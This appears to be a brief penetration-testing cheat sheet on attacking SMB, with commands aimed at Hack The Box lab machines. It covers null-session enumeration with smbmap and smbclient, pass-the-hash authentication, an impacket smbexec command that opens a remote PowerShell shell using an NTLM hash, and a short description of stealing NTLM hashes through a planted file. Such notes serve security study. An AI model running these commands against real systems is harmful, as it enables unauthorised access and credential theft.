# SMB

## Null Session

**smbmap**:

```
 smbmap -H querier.htb -u anonymous -d localhost
```

Use the -R flag to recursively list everything.

**smbclient**:&#x20;

```
smbclient -L \querier.htb
```

Enter any password or supply the `--no-pass` flag.

## Pass The Hash

The NTLM hash of a user’s password is used in the NTLM challenge-response authentication protocol. Therefore, if you know the user’s NTLM hash, you can impersonate that user for services that rely on NTLM challenge-response.

Smbmap to enumerate an SMB share:

```
smbmap -u USERNAME -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B -H HOST
```

_Note: If you just have the NT hash, then you can just input the NT hash twice. No one really checks the LM hash anyways._

Execute commands over SMB (requires write permissions):

```
smbexec.py jeeves/Administrator@jeeves.htb -hashes "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" -shell-type "powershell"
```

## NTLM Hash Theft

If you have access to a network share, then you can drop a file in there that will result in a user's NTLM hash being stolen when they navigate to that share.&#x20;

TODO: Link main article in post exploitation

